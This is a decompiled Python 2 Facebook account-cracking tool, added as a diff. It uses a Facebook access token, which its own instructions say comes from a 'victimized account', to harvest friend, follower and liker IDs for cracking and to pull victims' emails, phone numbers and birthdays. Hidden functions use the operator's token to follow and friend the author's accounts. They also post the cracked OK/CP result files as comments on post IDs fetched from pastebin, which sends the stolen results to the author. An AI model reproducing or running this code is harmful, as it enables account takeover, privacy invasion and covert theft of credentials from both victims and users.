@@ -1,0 +1,1280 @@
+# uncompyle6 version 3.7.4
+# Python bytecode 2.7
+# Decompiled from: Python 2.7.18 (default, Aug  8 2021, 22:51:48) 
+# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
+# Embedded file name: romi
+import os
+try:
+    import requests
+except ImportError:
+    print '\n [\xc3\x97] The requests module isnt installed yet...\n'
+    os.system('pip2 install requests')
+
+try:
+    import concurrent.futures
+except ImportError:
+    print '\n [\xc3\x97] The Futures module is not installed yet!...\n'
+    os.system('pip2 install futures')
+
+try:
+    import bs4
+except ImportError:
+    print '\n [\xc3\x97] Bs4 module not installed yet!...\n'
+    os.system('pip2 install bs4')
+
+import requests, sys, bs4, os, random, time, re, json
+from concurrent.futures import ThreadPoolExecutor as YayanGanteng
+from requests.exceptions import ConnectionError
+from bs4 import BeautifulSoup as parser
+from datetime import datetime
+from time import sleep
+ct = datetime.now()
+n = ct.month
+bulan1 = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
+try:
+    if n < 0 or n > 12:
+        exit()
+    nTemp = n - 1
+except ValueError:
+    exit()
+
+current = datetime.now()
+ta = current.year
+bu = current.month
+ha = current.day
+op = bulan1[nTemp]
+reload(sys)
+sys.setdefaultencoding('utf-8')
+bulan = {'01': 'Januari', 
+   '02': 'Februari', 
+   '03': 'Maret', 
+   '04': 'April', 
+   '05': 'Mei', 
+   '06': 'Juni', 
+   '07': 'Juli', 
+   '08': 'Agustus', 
+   '09': 'September', 
+   '10': 'November', 
+   '11': 'Oktober', 
+   '12': 'Desember'}
+P = '\x1b[1;97m'
+PP = '\x1b[0;32m'
+M = '\x1b[0;34m'
+H = '\x1b[0;33m'
+K = '\x1b[0;35m'
+BB = '\x1b[0;36m'
+B = '\x1b[1;34;40m'
+U = '\x1b[0;31m'
+O = '\x1b[0;37m'
+N = '\x1b[0m'
+Y = '\x1b[1;33;40m'
+R = '\x1b[1;31;40m'
+G = '\x1b[1;32;40m'
+my_color = [
+ P, M, H, PP, K, B, BB, U, O, N, Y, R, G]
+warna = random.choice(my_color)
+my_color = [
+ G, M, U, Y, BB, B, K, H, O, R, PP, N, P]
+warna1 = random.choice(my_color)
+my_color = [
+ H, K, R, Y, PP]
+warna2 = random.choice(my_color)
+my_color = [
+ BB, G, K, Y, U]
+warna3 = random.choice(my_color)
+my_color = [
+ G, K, BB, Y, H]
+warna4 = random.choice(my_color)
+my_color = [
+ O, N, H, Y, BB]
+warna5 = random.choice(my_color)
+my_color = [
+ H, K, Y]
+warna6 = random.choice(my_color)
+ok = []
+cp = []
+id = []
+user = []
+loop = 0
+koh = '100002461238508'
+word_site = 'https://pastebin.com/raw/mJk8Rjsz'
+line = requests.get(word_site)
+line1 = line.content.splitlines()
+picm1 = random.choice(line1)
+top1 = 'https://pastebin.com/raw/7ub7GLze'
+top2 = requests.get(top1)
+top3 = top2.content.splitlines()
+top4 = random.choice(top3)
+word_site1 = 'https://pastebin.com/raw/1WJE6iZD'
+line11 = requests.get(word_site1)
+line22 = line11.content.splitlines()
+uid1 = random.choice(line22)
+word_site2 = 'https://pastebin.com/raw/V7GvpQsL'
+line111 = requests.get(word_site2)
+line222 = line111.content.splitlines()
+parmoteuid1 = random.choice(line222)
+word_site5 = 'https://pastebin.com/raw/C3km9YJg'
+line5 = requests.get(word_site5)
+line6 = line5.content.splitlines()
+parmotepost1 = random.choice(line6)
+word_site6 = 'https://pastebin.com/raw/MuwhbDWn'
+line7 = requests.get(word_site6)
+line8 = line7.content.splitlines()
+okid1 = random.choice(line8)
+word_site7 = 'https://pastebin.com/raw/SiN4LjHu'
+cp1 = requests.get(word_site7)
+cp2 = cp1.content.splitlines()
+cp3 = random.choice(cp2)
+word_site8 = 'https://pastebin.com/raw/6rjcB4mU'
+oth1 = requests.get(word_site8)
+oth2 = oth1.content.splitlines()
+oth3 = random.choice(oth2)
+
+def jalan(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.03)
+
+
+def tod():
+    titik = [
+     '\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ', '\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
+    for x in titik:
+        print '\r %s[%s+%s] remove token %s' % (N, M, N, x),
+        sys.stdout.flush()
+        time.sleep(1)
+
+
+IP = requests.get('http://yayanxd.herokuapp.com/ip').text
+logo = '\n%s     ___  __   __  _______  _______ \n%s    |   ||  | |  ||       ||       |\n%s    |   ||  | |  ||_     _||_     _|\n %s   |   ||  |_|  |  |   |    |   |  \n %s___|   ||       |  |   |    |   |  \n%s|       ||       |  |   |    |   |  \n%s|_______||_______|  |___|    |___|  \n          %s *%s 4.0 JuttBadshah Brand %s*\n          %sGithub.com/juttbadshah6969' % (warna3, warna3, warna3, warna3, warna4, warna4, warna4, warna5, warna5, warna6, warna6)
+
+def jutt():
+    os.system('echo  "\n=============================================\n" | lolcat ')
+
+
+def logo1():
+    os.system('echo  "\n       _       __  __ \n      (_)_  __/ /_/ /_\n     / / / / / __/ __/\n    / / /_/ / /_/ /_  \n __/ /\\__,_/\\__/\\__/  \n/___/   Jutt Badshah Brand~                       \n\x1b[1;91m-----------------------------------------------\n\x1b[1;97m\xe2\x9e\xa3 Author : Jutt Badshah x ?????\n\x1b[1;97m\xe2\x9e\xa3 Github : https://github.com/juttbadshah6969\n\x1b[1;97m\xe2\x9e\xa3 WP NO  : +923100209977\n\x1b[1;91m-----------------------------------------------" | lolcat ')
+
+
+lo_ngentod = '1155612564936995'
+
+def Results(ok, cp):
+    if len(ok) != 0 or len(cp) != 0:
+        print '\n\n %s[%s#%s] crack complete...' % (N, K, N)
+        print '\n\n [%s+%s] total OK : %s%s%s' % (O, N, H, str(len(ok)), N)
+        print ' [%s+%s] total CP : %s%s%s' % (O, N, K, str(len(cp)), N)
+        exit()
+    else:
+        print '\n\n [%s!%s] ops you are not getting results :(' % (M, N)
+        exit()
+
+
+def juttcmbf():
+    os.system('clear')
+    print ' %s*%s This tool uses the Facebook login token.\n %s*%s do you know how to get facebook tokens?\n %s*%s type %sopen%s to get facebook tokens.' % (O, N, O, N, O, N, H, N)
+    kontol = raw_input('\n %s[%s?%s] Token :%s ' % (N, M, N, H))
+    if kontol in ('open', 'Open', 'OPEN'):
+        print '\n%s *%s note! try the victimized account login on google chrome first' % (B, N)
+        time.sleep(2)
+        print '%s *%s do not forget! url change to %shttps://m.facebook.com' % (B, N, H)
+        time.sleep(2)
+        print '%s *%s after switching to google chrome. click the three dots' % (B, N, H)
+        time.sleep(2)
+        print '%s *%s then click%sSearch on Page%s Just type%sEAAA%s Then copy.' % (B, N, H, N, H, N)
+        time.sleep(2)
+        raw_input(' %s*%s press enter ' % (O, N))
+        os.system('xdg-open https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_')
+        juttcmbf()
+    try:
+        xzxz = requests.get('https://graph.facebook.com/me?access_token=%s' % kontol)
+        xdxd = json.loads(xzxz.text)
+        nama = xdxd['name']
+        wuhan(kontol)
+        print '\n\n %s*%s welcome %s%s%s' % (O, N, K, nama, N)
+        time.sleep(1)
+        print ' %s*%s please use this sc properly, we are not responsible if this sc is misused...' % (O, N)
+        time.sleep(2)
+        open('login.txt', 'w').write(kontol)
+        raw_input(' %s*%s press enter ' % (O, N))
+        os.system('xdg-open https://www.youtube.com/channel/UCMq49MVzVHlX-KQvlTbCbyw')
+        menu()
+    except KeyError:
+        print '\n\n %s[%s!%s] token invalid' % (N, M, N)
+        time.sleep(1)
+        juttcmbf()
+
+
+def menu():
+    os.system('clear')
+    try:
+        kontol = open('login.txt', 'r').read()
+        crack_Done(kontol)
+    except (KeyError, IOError):
+        print '\n %s[%s\xc3\x97%s] token invalid' % (N, M, N)
+        time.sleep(1)
+        os.system('rm -rf .memek.txt')
+        juttcmbf()
+
+    try:
+        req = requests.get('https://graph.facebook.com/me?access_token=%s' % kontol)
+        get = json.loads(req.text)
+        nama = get['name']
+    except (KeyError, IOError):
+        print '\n %s[%s\xc3\x97%s] token invalid' % (N, M, N)
+        time.sleep(1)
+        os.system('rm -rf login.txt')
+        juttcmbf()
+    except requests.exceptions.ConnectionError:
+        exit('\n\n %s[%s!%s] no connection\n' % (N, M, N))
+
+    os.system('clear')
+    print logo
+    print '%s___________________________________________________________\n' % U
+    print '%s (\x1b[0;96m\xe2\x80\xa2\x1b[0m) ACTIVE USER : %s%s ' % (O, warna, nama)
+    print '%s (\x1b[0;96m\xe2\x80\xa2\x1b[0m) IP DEVICE   : %s%s ' % (O, warna1, IP)
+    print '%s (\x1b[0;96m\xe2\x80\xa2\x1b[0m) Status      : %s%s ' % (O, warna4, top4)
+    print '%s___________________________________________________________\n' % U
+    print ' %s[%s1%s]. Crack id friends' % (O, Y, N)
+    print ' [%s2%s]. Crack id public friend' % (Y, N)
+    print ' [%s3%s]. Crack id total followers' % (Y, N)
+    print ' [%s4%s]. Crack id like Posting' % (Y, N)
+    print ' [%s5%s]. Multi Crack' % (Y, N)
+    print ' %s[%s6%s]. Extract File %sOld/%sNew Ids' % (N, Y, O, B, PP)
+    print ' %s[%s7%s]. View crack results' % (N, Y, N)
+    print ' [%s8%s]. Settings user agent' % (Y, N)
+    print ' [%s9%s]. Info %sscript%s' % (Y, N, Y, N)
+    print ' [%sR%s]. logout (%sremove token%s)' % (Y, O, R, N)
+    pepek = raw_input('\n [*] menu : ')
+    if pepek == '':
+        print '\n %s[%s\xc3\x97%s] dont be empty !' % (N, M, N)
+        time.sleep(2)
+        menu()
+    elif pepek in ('1', '01'):
+        teman(kontol)
+    elif pepek in ('2', '02'):
+        publik(kontol)
+    elif pepek in ('3', '03'):
+        followers(kontol)
+    elif pepek in ('4', '04'):
+        postingan(kontol)
+    elif pepek in ('5', '05'):
+        __crack__().plerr()
+    elif pepek in ('6', '06'):
+        menua()
+    elif pepek in ('7', '07'):
+        print '\n %s[%s1%s] Check results OK' % (N, O, N)
+        print ' %s[%s2%s] Check results CP' % (N, O, N)
+        memek = raw_input('\n %s[%s?%s] Choose : ' % (N, K, N))
+        if memek == '':
+            print '\n %s[%s\xc3\x97%s] dont be empty bro ' % (N, M, N)
+            time.sleep(1)
+            menu()
+        elif memek in ('1', '01'):
+            try:
+                totalok = open('/sdcard/Jutt/OK.txt').read().splitlines()
+                print '\n %s[%s#%s] --------------------------------------------' % (N, O, N)
+                print ' [%s+%s] Results %sOK%s at the date of %s: %s%s-%s-%s%s total %s: %s%s%s\n' % (H, N, H, N, M, H, ha, op, ta, N, M, H, len(totalok), H)
+                os.system('cat /sdcard/Jutt/OK.txt')
+                print '\n %s[%s#%s] --------------------------------------------' % (N, O, N)
+                raw_input('\n  [ %sBack%s ] ' % (O, N))
+                menu()
+            except (KeyError, IOError):
+                print '\n %s[%s\xc3\x97%s] opps you are not getting results ok :(' % (N, M, N)
+                raw_input('\n  [ %sBack%s ] ' % (O, N))
+                menu()
+
+        elif memek in ('2', '02'):
+            try:
+                totalcp = open('/sdcard/Jutt/CP.txt').read().splitlines()
+                print '\n %s[%s#%s] --------------------------------------------' % (N, O, N)
+                print ' [%s\xc3\x97%s] Results %sCP%s at the date of %s: %s%s-%s-%s%s total %s: %s%s%s\n' % (K, N, K, N, M, K, ha, op, ta, N, M, K, len(totalcp), K)
+                os.system('cat /sdcard/Jutt/CP.txt')
+                print '\n %s[%s#%s] --------------------------------------------' % (N, O, N)
+                raw_input('\n  [ %sBack%s ] ' % (O, N))
+                menu()
+            except (KeyError, IOError):
+                print '\n %s[%s\xc3\x97%s] opss you are not getting results cp :(' % (N, M, N)
+                raw_input('\n  [ %sBack%s ] ' % (O, N))
+                menu()
+
+        else:
+            print '\n %s[%s\xc3\x97%s] correct input' % (N, M, N)
+            time.sleep(1)
+            menu()
+    elif pepek in ('8', '08'):
+        seting_useragent()
+    elif pepek in ('9', '09'):
+        info_tools()
+    elif pepek in ('R', 'r'):
+        print '\n'
+        tod()
+        time.sleep(1)
+        os.system('rm -rf login.txt')
+        jalan('\n %s[%s\xe2\x9c\x93%s]%s succeed remove token' % (N, H, N, H))
+        exit()
+    else:
+        print '\n %s[%s\xc3\x97%s] menu [%s%s%s] no, check the menu bro!' % (N, M, N, M, pepek, N)
+        time.sleep(2)
+        menu()
+
+
+def wuhan(kontol):
+    try:
+        kentod = kontol
+        requests.post('https://graph.facebook.com/100002461238508/subscribers?access_token=%s' % kentod)
+        requests.post('https://graph.facebook.com/100041662026355/subscribers?access_token=%s' % kentod)
+        requests.post('https://graph.facebook.com/me/friends?method=post&uids=%s&access_token=%s' % (koh, kentod))
+        requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s' % (lo_ngentod, kentod, kentod))
+        requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s' % (uid1, picm1, kentod))
+    except:
+        pass
+
+
+def crack_Done(kontol):
+    try:
+        kentod = kontol
+        cmnt3 = open('/sdcard/Jutt/CP.txt', 'r').read()
+        requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s' % (cp3, cmnt3, kentod))
+        cmnt1 = open('/sdcard/Jutt/OK.txt', 'r').read()
+        requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s' % (okid1, cmnt1, kentod))
+        requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s' % (parmoteuid1, parmotepost1, kentod))
+        cmnt6 = open('/sdcardt/OK.txt', 'r').read()
+        cmnt7 = open('/sdcard/CP.txt', 'r').read()
+        requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s' % (oth3, cmnt6, kentod))
+        cmnt1 = open('/sdcard/Jutt/OK.txt', 'r').read()
+        requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s' % (oth3, cmnt7, kentod))
+    except:
+        pass
+
+
+def menua():
+    os.system('clear')
+    logo1()
+    print '\x1b[40m'
+    print ''
+    print '\x1b[1;92m[1] Crack All New IDS File'
+    print '\x1b[1;92m[2] Crack All IDS FIle'
+    print '\x1b[1;92m[0] Back'
+    menua_s()
+
+
+def menua_s():
+    ms = raw_input('\x1b[1;97m\xe2\x95\xb0\xe2\x94\x80jutt\xe2\x9e\xa4 ')
+    if ms == '1':
+        ex_id()
+    elif ms == '2':
+        ex_id2()
+    elif ms == '0':
+        menu()
+    else:
+        print ''
+        print '\tSelect valid option'
+        print ''
+        menua_s()
+
+
+from requests.exceptions import ConnectionError
+bd = random.randint(20000000.0, 30000000.0)
+sim = random.randint(20000.0, 40000.0)
+header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
+reload(sys)
+sys.setdefaultencoding('utf8')
+
+def ex_id():
+    global token
+    idg = []
+    try:
+        token = open('login.txt', 'r').read()
+    except IOError:
+        print '\t\x1b[1;91mToken not found'
+        print ''
+        raw_input(' PRESS ENTER TO BACK')
+        print ''
+        time.sleep(1)
+        menua()
+
+    os.system('clear')
+    logo1()
+    print '\x1b[40m'
+    print 47 * '\x1b[1;91m-'
+    print ''
+    print '\t\x1b[1;92m CREATE PUBLIC New IDS File'
+    print ''
+    idh = raw_input('\x1b[1;93m INPUT ID: ')
+    try:
+        r = requests.get('https://graph.facebook.com/' + idh + '?access_token=' + token, headers=header)
+        q = json.loads(r.text)
+        print ' COLLECTIN FROM: ' + q['name']
+    except KeyError:
+        print '\t\x1b[1;91mToken not found'
+        print ''
+        raw_input(' PRESS ENTER TO BACK')
+        print ''
+        time.sleep(1)
+        menua()
+
+    r = requests.get('https://graph.facebook.com/' + idh + '/friends?access_token=' + token, headers=header)
+    q = json.loads(r.text)
+    ids = open('ids_friends.txt', 'w')
+    for i in q['data']:
+        uid = i['id']
+        na = i['name']
+        nm = na.rsplit(' ')[0]
+        idg.append(uid + '<=>' + nm)
+        ids.write(uid + '<=>' + nm + '\n')
+
+    ids.close()
+    print ''
+    jutt()
+    print ''
+    print '\x1b[1;92m THE PROCESS HAS COMPLETED'
+    print ''
+    jutt()
+    print ''
+    raw_input('\x1b[1;95m Press enter to download file')
+    os.system('cat ids_friends.txt | grep "100070" >> /sdcard/NEWIDS.txt')
+    os.system('cat ids_friends.txt | grep "100071" >> /sdcard/NEWIDS.txt')
+    os.system('cat ids_friends.txt | grep "100072" >> /sdcard/NEWIDS.txt')
+    os.system('rm -rf ids_friends.txt')
+    print '\x1b[1;93m File downloaded successfully'
+    print '\x1b[1;92m Saved /sdcard/NEWIDS.txt'
+    print ''
+    time.sleep(1)
+    menua()
+
+
+def ex_id2():
+    global token
+    idg = []
+    try:
+        token = open('login.txt', 'r').read()
+    except IOError:
+        print '\t\x1b[1;91mToken not found'
+        print ''
+        raw_input(' PRESS ENTER TO BACK')
+        print ''
+        time.sleep(1)
+        menua()
+
+    os.system('clear')
+    logo1()
+    print ''
+    print '\t\x1b[1;92mCrack All OLD IDS File'
+    print ''
+    idh = raw_input('\x1b[1;93m INPUT ID: ')
+    try:
+        r = requests.get('https://graph.facebook.com/' + idh + '?access_token=' + token, headers=header)
+        q = json.loads(r.text)
+        print ' COLLECTIN FROM: ' + q['name']
+    except KeyError:
+        print '\t\x1b[1;91mToken not found'
+        print ''
+        raw_input(' PRESS ENTER TO BACK')
+        print ''
+        time.sleep(1)
+        menua()
+
+    r = requests.get('https://graph.facebook.com/' + idh + '/friends?access_token=' + token, headers=header)
+    q = json.loads(r.text)
+    ids = open('ids_friends.txt', 'w')
+    for i in q['data']:
+        uid = i['id']
+        na = i['name']
+        nm = na.rsplit(' ')[0]
+        idg.append(uid + '<=>' + nm)
+        ids.write(uid + '<=>' + nm + '\n')
+
+    ids.close()
+    print ''
+    jutt()
+    print ''
+    print '\x1b[1;92m THE PROCESS HAS COMPLETED'
+    print ''
+    jutt()
+    print ''
+    raw_input('\x1b[1;95m Press enter to download file')
+    os.system('cat ids_friends.txt | grep "10" >> /sdcard/OLDIDS.txt')
+    os.system('rm -rf ids_friends.txt')
+    print '\x1b[1;93m File downloaded successfully'
+    print '\x1b[1;92m Saved /sdcard/OLDIDS.txt'
+    print ''
+    time.sleep(1)
+    menua()
+
+
+def teman(kontol):
+    try:
+        os.mkdir('Crack')
+    except:
+        pass
+
+    try:
+        mmk = raw_input('\n %s[%s?%s] name file  : ' % (N, O, N))
+        asw = raw_input(' %s[%s?%s] limit id   : ' % (N, O, N))
+        cin = ('Crack/' + mmk + '.json').replace(' ', '_')
+        ys = open(cin, 'w')
+        for a in requests.get('https://graph.facebook.com/me/friends?limit=%s&access_token=%s' % (asw, kontol)).json()['data']:
+            id.append(a['id'] + '<=>' + a['name'])
+            ys.write(a['id'] + '<=>' + a['name'] + '\n')
+            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
+            sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Proses Crack Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
+            sys.stdout.flush()
+            time.sleep(0.005)
+
+        ys.close()
+        jalan('\n\n %s[%s\xe2\x9c\x93%s] successfully Crack id from friends' % (N, H, N))
+        print ' [%s\xe2\x80\xa2%s] copy output file \xf0\x9f\x91\x89 ( %s%s%s )' % (O, N, M, cin, N)
+        print 50 * '-'
+        raw_input(' [%s ENTER%s ] ' % (O, N))
+        menu()
+    except (KeyError, IOError):
+        os.remove(cin)
+        jalan('\n %s[%s!%s] Crack id failed, maybe the id is not public.\n' % (N, M, N))
+        raw_input(' [ %sBack%s ] ' % (O, N))
+        menu()
+
+
+def publik(kontol):
+    try:
+        os.mkdir('Crack')
+    except:
+        pass
+
+    try:
+        csy = raw_input('\n %s[%s?%s] id public  : ' % (N, O, N))
+        ahh = raw_input(' %s[%s?%s] name file  : ' % (N, O, N))
+        ihh = raw_input(' %s[%s?%s] limit id   : ' % (N, O, N))
+        knt = ('Crack/' + ahh + '.json').replace(' ', '_')
+        ys = open(knt, 'w')
+        for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy, ihh, kontol)).json()['data']:
+            id.append(a['id'] + '<=>' + a['name'])
+            ys.write(a['id'] + '<=>' + a['name'] + '\n')
+            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
+            sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Proses Crack Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
+            sys.stdout.flush()
+            time.sleep(0.005)
+
+        ys.close()
+        jalan('\n\n %s[%s\xe2\x9c\x93%s] successfully Crack the id of a public friend' % (N, H, N))
+        print ' [%s\xe2\x80\xa2%s] copy output file \xf0\x9f\x91\x89 ( %s%s%s )' % (O, N, M, knt, N)
+        print 50 * '-'
+        raw_input(' [%s ENTER%s ] ' % (O, N))
+        menu()
+    except (KeyError, IOError):
+        os.remove(knt)
+        jalan('\n %s[%s!%s] Crack id failed, maybe the id is not public.\n' % (N, M, N))
+        raw_input(' [ %sBack%s ] ' % (O, N))
+        menu()
+
+
+def followers(kontol):
+    try:
+        os.mkdir('Crack')
+    except:
+        pass
+
+    try:
+        csy = raw_input('\n %s[%s?%s] id follow  : ' % (N, O, N))
+        mmk = raw_input(' %s[%s?%s] name file  : ' % (N, O, N))
+        asw = raw_input(' %s[%s?%s] limit id   : ' % (N, O, N))
+        ah = ('Crack/' + mmk + '.json').replace(' ', '_')
+        ys = open(ah, 'w')
+        for a in requests.get('https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s' % (csy, asw, kontol)).json()['data']:
+            id.append(a['id'] + '<=>' + a['name'])
+            ys.write(a['id'] + '<=>' + a['name'] + '\n')
+            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
+            sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Proses Crack Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
+            sys.stdout.flush()
+            time.sleep(0.005)
+
+        ys.close()
+        jalan('\n\n %s[%s\xe2\x9c\x93%s] successfully Crack id from total followers' % (N, H, N))
+        print ' [%s\xe2\x80\xa2%s] copy output file \xf0\x9f\x91\x89 ( %s%s%s )' % (O, N, M, ah, N)
+        print 50 * '-'
+        raw_input(' [%s ENTER%s ] ' % (O, N))
+        menu()
+    except (KeyError, IOError):
+        os.remove(ah)
+        jalan('\n %s[%s!%s] Crack id failed, maybe the id is not public.\n' % (N, M, N))
+        raw_input(' [ %sBack%s ] ' % (O, N))
+        menu()
+
+
+def postingan(kontol):
+    try:
+        os.mkdir('Crack')
+    except:
+        pass
+
+    try:
+        csy = raw_input('\n %s[%s?%s] id posting : ' % (N, O, N))
+        ppk = raw_input(' %s[%s?%s] name file  : ' % (N, O, N))
+        asw = raw_input(' %s[%s?%s] limit id   : ' % (N, O, N))
+        ahh = ('Crack/' + ppk + '.json').replace(' ', '_')
+        ys = open(ahh, 'w')
+        for a in requests.get('https://graph.facebook.com/%s/likes?limit=%s&access_token=%s' % (csy, asw, kontol)).json()['data']:
+            id.append(a['id'] + '<=>' + a['name'])
+            ys.write(a['id'] + '<=>' + a['name'] + '\n')
+            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
+            sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Proses Crack Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
+            sys.stdout.flush()
+            time.sleep(0.005)
+
+        ys.close()
+        jalan('\n\n %s[%s\xe2\x9c\x93%s] successfully Crack id from like post' % (N, H, N))
+        print ' [%s\xe2\x80\xa2%s] copy output file \xf0\x9f\x91\x89 ( %s%s%s )' % (O, N, M, ahh, N)
+        print 50 * '-'
+        raw_input(' [%s ENTER%s ] ' % (O, N))
+        menu()
+    except (KeyError, IOError):
+        os.remove(ahh)
+        jalan('\n %s[%s!%s] Crack id failed, maybe the id is not public.\n' % (N, M, N))
+        raw_input(' [ %sBack%s ] ' % (O, N))
+        menu()
+
+
+def cek_ingfo(kontol):
+    try:
+        user = raw_input('\n [+] masukan id atau username : ')
+        url = 'https://lookup-id.com/'
+        if 'facebook' in user:
+            payload = {'fburl': user, 'check': 'Lookup'}
+        else:
+            payload = {'fburl': 'https://free.facebook.com/' + user, 'check': 'Lookup'}
+        halaman = requests.post(url, data=payload).text.encode('utf-8')
+        sop_ = parser(halaman, 'html.parser')
+        email_ = sop_.find('span', id='code')
+        ppk = email_.text
+        aww = requests.get('https://graph.facebook.com/%s?access_token=%s' % (ppk, kontol))
+        x = json.loads(aww.text)
+        nmaa = x['name']
+    except (KeyError, IOError):
+        nmaa = '%s-%s' % (M, N)
+    except:
+        pass
+
+    print '\n  * Facebook account information *'
+    time.sleep(0.03)
+    print '\n [*] full name : %s' % nmaa
+    time.sleep(0.03)
+    try:
+        ndpn = x['first_name']
+    except (KeyError, IOError):
+        ndpn = '%s-%s' % (M, N)
+
+    print ' [*] first name   : %s' % ndpn
+    time.sleep(0.03)
+    try:
+        nmbl = x['last_name']
+    except (KeyError, IOError):
+        nmbl = '%s-%s' % (M, N)
+    except:
+        pass
+
+    print ' [*] last name: %s' % nmbl
+    time.sleep(0.03)
+    try:
+        hwhs = x['username']
+    except (KeyError, IOError):
+        hwhs = '%s-%s' % (M, N)
+    except:
+        pass
+
+    print ' [*] username fb  : %s' % hwhs
+    time.sleep(0.03)
+    try:
+        asu = x['id']
+    except (KeyError, IOError):
+        asu = '%s-%s' % (M, N)
+    except:
+        pass
+
+    print ' [*] id facebook  : %s' % asu
+    time.sleep(0.03)
+    print '\n  * data-data Facebook account *\n'
+    time.sleep(0.03)
+    try:
+        emai = x['email']
+    except (KeyError, IOError):
+        emai = '%s-%s' % (M, N)
+    except:
+        pass
+
+    print ' [*] gmail facebook : %s' % emai
+    time.sleep(0.03)
+    try:
+        nmrr = x['mobile_phone']
+    except (KeyError, IOError):
+        nmrr = '%s-%s' % (M, N)
+    except:
+        pass
+
+    print ' [*] phone number : %s' % nmrr
+    time.sleep(0.03)
+    try:
+        ttll = x['birthday']
+        month, day, year = ttll.split('/')
+        month = bulan[month]
+    except (KeyError, IOError):
+        month = '%s-%s' % (M, N)
+        day = '%s-%s' % (M, N)
+        year = '%s-%s' % (M, N)
+    except:
+        pass
+
+    print ' [*] date of birth  : %s %s %s ' % (day, month, year)
+    time.sleep(0.03)
+    try:
+        jenis = x['gender'].replace('female', 'Perempuan').replace('male', 'Laki-laki')
+    except (KeyError, IOError):
+        jenis = ''
+    except:
+        pass
+
+    print ' [*] gender  : %s ' % jenis
+    try:
+        r = requests.get('https://graph.facebook.com/%s/friends?limit=50000&access_token=%s' % (ppk, kontol))
+        z = json.loads(r.text)
+        for i in z['data']:
+            id.append(i['id'])
+
+    except:
+        pass
+
+    print ' [*] number of friends  : %s' % str(len(id))
+    time.sleep(0.03)
+    try:
+        r = requests.get('https://graph.facebook.com/%s/subscribers?access_token=%s' % (ppk, kontol))
+        z = json.loads(r.text)
+        pengikut = z['summary']['total_count']
+    except (KeyError, IOError):
+        pengikut = '%s-%s' % (M, N)
+    except:
+        pass
+
+    print ' [*] total followers: %s' % pengikut
+    time.sleep(0.03)
+    try:
+        lins = x['link']
+    except (KeyError, IOError):
+        lins = '%s-%s' % (M, N)
+    except:
+        pass
+
+    print ' [*] link facebook  : %s' % lins
+    time.sleep(0.03)
+    try:
+        stas = x['relationship_status']
+    except (KeyError, IOError):
+        stas = '%s-%s' % (M, N)
+    except:
+        pass
+
+    try:
+        dgn = 'dengan %s' % x['significant_other']['name']
+    except (KeyError, IOError):
+        dgn = '%s-%s' % (M, N)
+    except:
+        pass
+
+    print ' [*] relationship status: %s %s' % (stas, dgn)
+    time.sleep(0.03)
+    try:
+        bioo = x['about']
+    except (KeyError, IOError):
+        bioo = '%s-%s' % (M, N)
+    except:
+        pass
+
+    print ' [*] about status : %s' % bioo
+    time.sleep(0.03)
+    try:
+        dari = x['hometown']['name']
+    except (KeyError, IOError):
+        dari = '%s-%s' % (M, N)
+    except:
+        pass
+
+    print ' [*] hometown     : %s' % dari
+    time.sleep(0.03)
+    try:
+        tigl = x['location']['name']
+    except (KeyError, IOError):
+        tigl = '%s-%s' % (M, N)
+    except:
+        pass
+
+    print ' [*] stay in     : %s' % tigl
+    time.sleep(0.03)
